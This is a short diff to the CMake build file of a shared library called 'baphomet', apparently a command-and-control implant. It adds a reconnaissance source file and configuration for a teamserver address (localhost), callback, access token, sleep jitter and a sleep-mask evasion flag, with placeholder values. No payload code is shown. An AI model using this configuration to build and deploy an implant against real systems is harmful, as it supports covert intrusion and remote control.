@@ -43,7 +43,19 @@ add_library(baphomet SHARED src/main.cpp
         include/shell.hpp
         include/sleep.hpp
         include/structs.hpp
+        src/reconaissance/whoami.cpp
 )
 
+#TODO: make these configs work
+target_compile_definitions(baphomet PRIVATE CFG_CALLBACK_OBJECT="-")
+target_compile_definitions(baphomet PRIVATE CFG_TEAMSERVER_ADDRESS="127.0.0.1")
+target_compile_definitions(baphomet PRIVATE CFG_TEAMSERVER_PORT=8081)
+target_compile_definitions(baphomet PRIVATE CFG_ACCESS_TOKEN="-")
+target_compile_definitions(baphomet PRIVATE CFG_USER_AGENT="-")
+target_compile_definitions(baphomet PRIVATE CFG_SLEEP_TIME=2500)
+target_compile_definitions(baphomet PRIVATE CFG_JITTER=2500)
+target_compile_definitions(baphomet PRIVATE CFG_USE_HTTPS=false)
+
 target_compile_definitions(baphomet PRIVATE BAPHOMET_DEBUG)
+target_compile_definitions(baphomet PRIVATE BAPHOMET_USE_SLEEPMASK)
 target_include_directories(baphomet PRIVATE ${MAIN_INCLUDE_DIR})
